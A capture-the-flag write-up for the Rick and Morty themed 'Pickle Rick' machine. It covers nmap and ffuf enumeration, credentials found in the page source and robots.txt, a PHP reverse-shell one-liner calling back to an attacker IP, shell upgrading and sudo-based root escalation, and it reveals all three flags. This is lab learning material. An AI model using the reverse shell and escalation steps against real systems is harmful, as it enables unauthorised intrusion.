# Pickle Rick Write‑up 

A Rick and Morty themed CTF where the objective is to **find three secret ingredients** to help Rick become human again.

---

## Target Information

Target Machine IP:

```
10.128.157.170
```

---

## Connectivity Check

First, I verified that the target machine was reachable using **ping**.

```bash
ping 10.128.157.170
```

Result:

```
64 bytes from 10.128.157.170: icmp_seq=1 ttl=62 time=158 ms
64 bytes from 10.128.157.170: icmp_seq=2 ttl=62 time=183 ms
```

The host is **up and reachable**.

---

## Port Scanning

Next, I scanned the target using **Nmap** to identify open ports and services.

```bash
nmap -sV 10.128.157.170
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

### Findings

Two ports are open:

|Port|Service|
|---|---|
|22|SSH|
|80|HTTP|

Since **HTTP is available**, I started with **web enumeration**.

---

## Web Enumeration

Opening the website in the browser revealed a **Rick and Morty themed page**.

I checked the **page source code** and discovered a username:

```
Username: R1ckRul3s
```

---

## Directory Fuzzing

Next, I performed **directory brute forcing** using **ffuf**.

### Command 1

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.157.170/FUZZ
```

### Command 2

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.128.157.170/FUZZ
```

Discovered endpoints:

```
/robots.txt
/login.php
```

---

## Robots.txt Discovery

Opening:

```
http://10.128.157.170/robots.txt
```

Revealed the string:

```
Wubbalubbadubdub
```

This looked like a **possible password**.

---

## Login Page

Next I accessed:

```
http://10.128.157.170/login.php
```

Using the credentials:

```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

Login succeeded and redirected to:

```
/portal.php
```

This page allowed **command execution on the server**.

---

## Reverse Shell

To gain full access to the system, I obtained a **reverse shell**.

### Step 1: Start Listener

On my attacker machine:

```bash
nc -lvnp 4444
```

---

### Step 2: Execute Reverse Shell

Inside the command execution portal I ran a PHP reverse shell.

```php
php -r '$sock=fsockopen("192.168.128.91",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

This created a connection back to my machine and provided a shell.

---

## Shell Upgrade

The initial shell was limited, so I upgraded it.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then I set the terminal:

```bash
export TERM=xterm
```

Now the shell behaved like a normal terminal.

---

## Finding the First Ingredient

Inside the web directory:

```bash
ls /var/www/html
```

Files found:

```
Sup3rS3cretPickl3Ingred.txt
clue.txt
portal.php
login.php
```

Reading the file:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

First ingredient:

```
mr. meeseek hair
```

---

## Finding the Second Ingredient

Checking user directories:

```bash
ls /home
```

```
rick
ubuntu
```

Navigate to Rick's directory:

```bash
cd /home/rick
ls
```

Found file:

```
second ingredients
```

Reading it:

```bash
cat "second ingredients"
```

Second ingredient:

```
1 jerry tear
```

---

## Privilege Escalation

Next I checked sudo permissions:

```bash
sudo -l
```

Output:

```
(ALL) NOPASSWD: ALL
```

This means the user **www-data can run any command as root without a password**.

So I spawned a root shell:

```bash
sudo /bin/sh
```

Verify:

```bash
whoami
```

Result:

```
root
```

---

## Finding the Third Ingredient

Navigate to root directory:

```bash
cd /root
ls
```

Found:

```
3rd.txt
```

Reading the file:

```bash
cat 3rd.txt
```

Third ingredient:

```
fleeb juice
```

---

## Final Ingredients

|Ingredient|Value|
|---|---|
|First|mr. meeseek hair|
|Second|1 jerry tear|
|Third|fleeb juice|

Rick can now become human again.

---

## Skills Learned

- Network scanning with **Nmap**
    
- Web enumeration
    
- Directory fuzzing with **ffuf**
    
- Credential discovery
    
- Reverse shells
    
- Shell upgrading
    
- Linux enumeration
    
- Privilege escalation with **sudo misconfiguration**